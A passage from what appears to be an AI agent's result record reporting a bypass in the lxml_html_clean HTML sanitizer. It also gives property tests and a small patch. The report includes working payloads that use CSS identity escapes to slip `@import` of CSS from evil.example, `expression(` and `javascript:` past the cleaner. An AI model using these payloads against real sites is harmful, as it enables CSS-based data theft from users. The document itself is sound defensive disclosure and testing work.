@\\import` as `@import`, but the cleaner leaves it alone:\n\n```python\nclean_html('<div><style>@\\\\69mport url(http://evil.example/x.css);</style></div>')\n# -> '<div><style>/* deleted */</style></div>'                          (hex escape caught)\nclean_html('<div><style>@\\\\import url(http://evil.example/x.css);</style></div>')\n# -> '<div><style>@\\import url(http://evil.example/x.css);</style></div>'   (gets through)\n```\n\nWith default settings, `<style>` content that loads arbitrary external CSS survives cleaning. That allows CSS-based data theft. It's the same kind of bypass the hex-escape decoding was added to close. The same trick works on `e\\xpression(` and `url(j\\avascript:...)`, in both `<style>` tags and `style` attributes.\n\n**Properties tested (4):**\n- **No dangerous CSS in `<style>`:** fails on `@impor\\t`, `express\\ion(` and `javasc\\ript:`.\n- **No dangerous CSS in `style` attributes:** fails the same way.\n- **No `javascript:` links:** passes, including with whitespace and percent-encoding mixed into the scheme.\n- **No `<script>` tags or `on*` event attributes:** passes.\n\n**Fix:** I extended the escape regex so it also decodes identity escapes (a 3-line change, included in the report). With the patch, all 4 property tests pass. The project's own test suite has 3 doctest failures, but the same 3 fail without the patch, so the patch doesn't cause them.\n\nFiles are in `runs/lxml-html-clean2_r4`:\n- bug_report_lxml_html_clean_clean_2026-10-06_02-37_89sx.md\n- tests/test_clean.py\n- patched/ (the patched copy)","ttft_ms":2108,"type":"result","duration_ms":97845,"uuid":"7f02de09-6031-434e-a4c5-8d3f4bb44343","ttft_stream_ms":1965,"time_to_request_ms":617,"first_content_frame_ms":1965,"queued_turn_count":0,"result_index":0}
